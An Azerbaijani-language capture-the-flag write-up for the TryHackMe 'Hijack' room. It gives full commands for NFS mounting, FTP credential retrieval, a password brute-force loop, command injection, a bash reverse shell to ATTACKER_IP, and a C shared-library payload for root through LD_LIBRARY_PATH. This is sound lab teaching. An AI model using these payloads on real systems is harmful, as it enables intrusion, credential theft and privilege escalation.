# TryHackMe Hijack — Azərbaycan dilində Write-up

> Yalnız TryHackMe laboratoriyası üçün. `TARGET_IP`-ni öz maşınının IP-si ilə əvəz et.

## Hücum zənciri

Nmap → NFS export → FTP credential → parol siyahısı → admin panel → command injection → Rick → `LD_LIBRARY_PATH` → root.

## 1. Enumeration

```bash
nmap -sC -sV -p- -T4 TARGET_IP -oN nmap.txt
```

Əsas portlar: `21 FTP`, `22 SSH`, `80 HTTP`, `111 rpcbind`, `2049 NFS`.

## 2. NFS

```bash
showmount -e TARGET_IP
rpcinfo -p TARGET_IP
sudo mkdir -p /tmp/hijack-nfs
sudo mount -t nfs TARGET_IP:/mnt/share /tmp/hijack-nfs -o nolock
ls -la /tmp/hijack-nfs
```

`Permission denied` olarsa UID-ni yoxla və uyğun lokal istifadəçi yarat:

```bash
ls -ln /tmp/hijack-nfs
sudo useradd -u UID_NUMBER -m -s /bin/bash nfsuser
sudo su - nfsuser
ls -la /tmp/hijack-nfs
```

Paylaşımda FTP məlumatı tapılır: `ftpuser / W3stV1rg1n14M0un741nM4m4`.

## 3. FTP

```bash
ftp TARGET_IP
```

FTP daxilində gizli faylları göstər və götür:

```text
ftp> ls -la
ftp> get .from_admin.txt
ftp> get .passwords_list.txt
ftp> bye
```

`.passwords_list.txt` admin parolunu yoxlamaq üçün istifadə olunur. Yoxlamanı yalnız THM IP-si üzərində apar:

```bash
while read -r pass; do curl -s -o /dev/null -w "%{http_code} $pass\n" -X POST http://TARGET_IP/ -d "username=admin&password=$pass"; done < .passwords_list.txt
```

## 4. `ls.service` nə deməkdir?

Sənin gördüyün:

```text
Loaded: not-found
Active: inactive (dead)
```

Bu, `ls` komandasının işləməsi deyil. Tətbiq input-u çox güman ki, belə istifadə edir:

```bash
systemctl status ls.service
```

`ls` service olmadığı üçün `not-found` çıxır. Command injection yoxlamaq üçün normal service adından sonra shell operatoru əlavə edilir:

```text
SERVICE_NAME; id
SERVICE_NAME; whoami
```

`uid=...` və ya istifadəçi adı görünürsə, injection təsdiqlənir. `SERVICE_NAME` yerinə formun qəbul etdiyi real service adını yaz.

## 5. Shell əldə etmək

Listener:

```bash
nc -lvnp 4444
```

Paneldə, yalnız laboratoriya daxilində, command injection sahəsinə bu tip payload göndərilir:

```text
SERVICE_NAME; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Shell gəldikdən sonra:

```bash
whoami
id
find / -name user.txt 2>/dev/null
cat /home/*/user.txt
```

## 6. Rick istifadəçisi

Web config/source fayllarında credential axtar:

```bash
find /var/www -type f -maxdepth 4 -print 2>/dev/null
grep -RniE 'password|passwd|rick|DB_' /var/www 2>/dev/null
```

Tapılan parolla:

```bash
su - rick
sudo -l
```

Rick Apache-ni root olaraq və `LD_LIBRARY_PATH` ilə işlədə bilir.

## 7. Root privilege escalation

Apache library-lərini yoxla:

```bash
ldd /usr/sbin/apache2
```

`sudoers`-də icazə verilən path və `ldd` nəticəsindəki real library adından istifadə et. Laboratoriyada həmin adla shared library yaradılır:

```c
#include <unistd.h>
void __attribute__((constructor)) init(void) {
 setuid(0); setgid(0); execl("/bin/bash", "bash", "-p", NULL);
}
```

```bash
gcc -shared -fPIC -o hijack.so hijack.c
sudo LD_LIBRARY_PATH=/tmp/apache_lib /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
id
cat /root/root.txt
```

## Flag-lər

`user.txt` və `root.txt` dəyərlərini öz maşınından götürüb THM suallarına yaz.

## Əsas dərslər

- NFS export həssas faylları ifşa edə bilər.
- UID mapping `Permission denied` probleminə səbəb ola bilər.
- FTP-də gizli fayllar üçün `ls -la` vacibdir.
- User input-un shell-ə təhlükəsizsiz ötürülməsi command injection yaradır.
- Plaintext web credential-ləri təhlükəlidir.
- Qorunmayan `LD_LIBRARY_PATH` shared-library hijacking-ə səbəb ola bilər.

## Mənbələr

- [TryHackMe — Hijack](https://tryhackme.com/room/hijack)
- [Nasrallah Baadi write-up](https://nasrallahbaadi.com/posts/THM-Hijack/)
- [Joseph Alan write-up](https://blog.devgenius.io/hijack-tryhackme-write-up-3bc64e873f00)
- [VincaSec write-up](https://vincasec.github.io/posts/hijack-tryhackme/)
